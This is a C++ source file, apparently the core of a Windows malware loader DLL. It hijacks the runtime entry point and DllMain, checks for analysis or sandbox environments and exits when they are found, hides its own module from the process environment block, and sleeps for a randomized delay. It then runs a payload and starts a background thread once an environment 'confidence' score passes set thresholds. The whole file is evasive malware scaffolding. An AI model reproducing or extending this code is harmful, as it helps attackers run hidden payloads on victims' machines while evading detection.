#include "stealth_loader.h"
#include "evasion.h"
#include "memory.h"
#include "crypto.h"
#include "api_resolver.h"
#include <iostream>

extern "C" void __scrt_common_main_seh() {
    jumpstart();
}

extern "C" void jumpstart() {
    startup();
}

extern "C" void startup() {
    printf("early execution initialized\n");
    busywork();

    if (!issafe()) {
        printf("mission compromise, retour a l'ombre.\n");
        ExitProcess(0);
    }

    envstats stats = getenvstats();
    static bool payloaddone = false;
    static bool threadstarted = false;

    if (stats.overall > 0.6f && !payloaddone) {
        payloaddone = true;
        printf("executing main payload (confidence: %.2f)\n", stats.overall);
        runpayload();
    }

    if (stats.overall > 0.65f && !threadstarted) {
        threadstarted = true;
        printf("starting adaptive operation thread (confidence: %.2f)\n", stats.overall);
        CreateThread(NULL, 0, background_loop, NULL, 0, NULL);
    }
    
    printf("early execution complete\n");
}

int __stdcall DllMain(void* module, unsigned long reason, void* reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        printf("[+] dll_process_attach - pid: %d\n", GetCurrentProcessId());
        hideself((void*)module);
        printf("[+] module hidden from peb\n");
        busywork();

        if (!issafe()) {
            printf("[-] unsafe environment\n");
            printf("mission compromise, retour a l'ombre.\n");
            return 0;
        }

        unsigned long delay = 30000 + (GetCurrentProcessId() % 7) * 1500;
        delay += (GetTickCount() % 5000);
        Sleep(delay);

        busywork();
        runpayload();
        busywork();
    }
    return 1;
}

extern "C" __declspec(dllexport) void nothing() {
    busywork();
}